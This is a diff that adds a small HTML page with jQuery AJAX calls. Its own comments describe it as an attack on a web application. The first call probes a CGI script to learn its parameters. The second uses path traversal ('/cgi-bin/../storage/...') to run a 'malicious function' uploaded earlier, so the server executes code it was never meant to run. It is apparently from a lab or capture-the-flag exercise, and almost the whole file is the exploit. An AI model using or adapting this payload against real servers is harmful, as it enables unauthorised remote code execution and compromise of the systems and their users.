@@ -1,0 +1,30 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script>
+	console.log("Running script");
+	// This first AJAX call should run a valid script, but return a Python traceback error.  This is to check
+	// work out the correct parameters for the AJAX call.  Not the leading '/' on the URL.
+	$.ajax({
+		type: "POST",
+		url: "/cgi-bin/getScreen2Data.py",
+		data: {	"fg_url": "blah",
+				"bg_url": "blah"},
+		success: function(data) {
+			console.log(data);
+		},
+		error: function(xhr, status, error) {
+			console.log(status, error);
+		}
+	});
+	// This second AJAX call attempts to run the malicious function we uploaded.  You will need to upload the
+	// script again and change the URL as old files are deleted from storage/
+	$.ajax({
+		type: "POST",
+		url: "/cgi-bin/../storage/d77391a0a00c36e16a7cab9599927d78.",
+		success: function(data) {
+			console.log(data);
+		},
+		error: function(xhr, status, error) {
+			console.log(status, error);
+		}
+	});
+</script>
